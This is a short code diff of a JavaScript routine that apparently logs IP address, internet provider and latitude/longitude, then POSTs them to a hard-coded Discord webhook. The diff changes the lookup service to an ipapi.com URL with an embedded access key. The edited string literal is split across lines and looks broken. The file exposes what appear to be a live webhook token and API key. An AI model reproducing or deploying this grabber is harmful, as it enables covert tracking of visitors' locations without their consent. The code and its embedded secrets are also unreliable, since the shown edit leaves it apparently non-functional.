@@ -2,11 +2,13 @@
 
 var webHookUrl = "https://discord.com/api/webhooks/991560534157697145/A4MFbVSmoTHQZ8VHbMxllzHAS_sRyKCQt7RAKgGqbv3qZpz471CKtPb3DWFoKL2zkfwQ";
 
-const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('http://ip-api.com/json/');
+const request = async () => { 
+    const response = await fetch('http://api.ipapi.com/api/161.185.160.93
+    ? access_key = 7120953cad8de1be74784eed4b6b35ea
+');
     const data = await response.json();
 
-    // Declaring variables
+
     var ip = data.query;
 
     var provider = data.org + " (" + data.as + ")";
@@ -21,7 +23,6 @@ const request = async () => { // Calling a "synchronous" fetch
     var lat = data.lat;
     var lon = data.lon;
 
-    // Open POST Request
     var postRequest = new XMLHttpRequest();
     postRequest.open("POST", webHookUrl);
 
